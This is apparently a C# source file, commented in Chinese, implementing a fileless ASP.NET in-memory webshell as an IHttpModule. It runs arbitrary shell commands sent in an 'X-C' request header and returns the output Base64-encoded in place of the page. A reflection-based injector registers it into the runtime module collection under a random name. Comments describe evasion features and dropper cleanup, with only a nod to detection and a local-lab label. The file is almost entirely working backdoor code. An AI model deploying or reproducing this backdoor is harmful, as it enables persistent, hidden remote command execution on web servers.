// ASPX IHttpModule 型内存马（完整实现 / 本地实验环境）
//
// ── 形态谱系（衔接 07 reflect.aspx 落地马）──
//   落地马（文件态）→ 注入器注册模块 → IHttpModule 内存马（无文件态）
//   本马与 08 Tomcat Filter 型同构：.NET 侧 = IHttpModule + 事件钩子链
//
// ── 免杀面 ──
//   1) 无文件驻留：模块注册进运行态 _moduleCollection，web.config 无条目
//   2) 触发仅凭 Header X-C：URL 零路径特征
//   3) 双事件面：BeginRequest（链首劫持执行）+ PreSendRequestContent（响应输出前
//      Clear + Base64 包装——避免 Response.End 截断管线的线程中止异常）
//   4) 模块名随机化（反静态审计）；执行异常静默（业务链路不中断）
//
// ── 自删纪律（重要，勿在代码内自动删）──
//   注入成功后落地引导马（如 07 的 reflect.aspx）应手工删除，完成无文件态收尾：
//     ① 带 X-C 头验证内存马已接管（有 Base64 回显即生效）
//     ② 定位落地文件：find <站点目录> -name '*.aspx' -mmin -30
//     ③ 删除：只删自己上传的引导文件，先备份再删（trash/回收站等可恢复方式）
//   不在代码内自动删除：删除 = 写盘 + 日志特征（检测点），且误删风险不可控。
//
// 检测侧配对见 NOTES.md；仅本地实验环境使用
using System;
using System.Web;
using System.Diagnostics;
using System.Reflection;

public class M : IHttpModule {

    public void Init(HttpApplication app) {
        // ── 事件面 1：BeginRequest——链首劫持，X-C 触发执行 ──
        //    检测侧：BeginRequest 钩子链枚举比对（IIS 遥测可列出已挂委托）
        app.BeginRequest += (s, e) => {
            HttpContext c = app.Context;
            string cmd = c.Request.Headers["X-C"];
            if (cmd == null) return;                     // 无触发头 → 业务正常流转
            try {
                bool win = (Environment.OSVersion.Platform == PlatformID.Win32NT);
                var psi = new ProcessStartInfo(
                    win ? "cmd" : "/bin/sh",
                    win ? "/c " + cmd : "-c \"" + cmd.Replace("\"", "\\\"") + "\"") {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi)) {
                    if (p == null) return;
                    string o = p.StandardOutput.ReadToEnd();
                    string err = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    // Base64 包装，存入 Items 供 PreSendRequestContent 统一输出
                    c.Items["__x_out"] =
                        Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(o));
                    c.Items["__x_err"] = err;
                }
            } catch { /* 执行失败 → 静默，业务继续 */ }
        };

        // ── 事件面 2：PreSendRequestContent——响应输出前包装 ──
        //    双事件分工：BeginRequest 执行、PreSendRequestContent 清空原 body 后只回
        //    Base64（对任何页面生效，无需 Response.End 截断管线）
        app.PreSendRequestContent += (s, e) => {
            object o = app.Context.Items["__x_out"];
            if (o == null) return;
            app.Context.Response.Clear();                // 丢弃业务页面原输出
            app.Context.Response.ContentType = "text/plain";
            string err = app.Context.Items["__x_err"] as string;
            app.Context.Response.Write(
                (string)o + (string.IsNullOrEmpty(err) ? "" : "|" + err));
        };
    }

    public void Dispose() { }

    // ── 注入器：初始马内调用 M.ModuleInjector.Install(HttpContext.Current) ──
    //    注册面按 .NET 版本选（见 NOTES 变体登记）：web.config modules 静态注册 /
    //    反射 _moduleCollection（本注入器）/ PreApplicationStartMethod
    public static class ModuleInjector {
        public static void Install(HttpContext c) {
            try {
                HttpApplication app = c.ApplicationInstance;
                // 反射获取运行态模块集合（web.config 之外的第二注册面）
                FieldInfo fi = typeof(HttpApplication).GetField("_moduleCollection",
                    BindingFlags.NonPublic | BindingFlags.Instance);
                var collection = fi.GetValue(app);       // System.Web.HttpModuleCollection

                // Add(string name, IHttpModule) 反射调用（跨版本兼容 public/internal 差异）
                MethodInfo add = collection.GetType().GetMethod("Add",
                    BindingFlags.NonPublic | BindingFlags.Instance, null,
                    new[] { typeof(string), typeof(IHttpModule) }, null);

                string name = "x-" + Guid.NewGuid().ToString("N").Substring(0, 8); // 随机名
                var m = new M();
                add.Invoke(collection, new object[] { name, m });
                m.Init(app);                             // 挂 BeginRequest/PreSendRequestContent
            } catch { /* 注册失败 → 静默（版本差异路线见 NOTES 变体登记） */ }
        }
    }
}
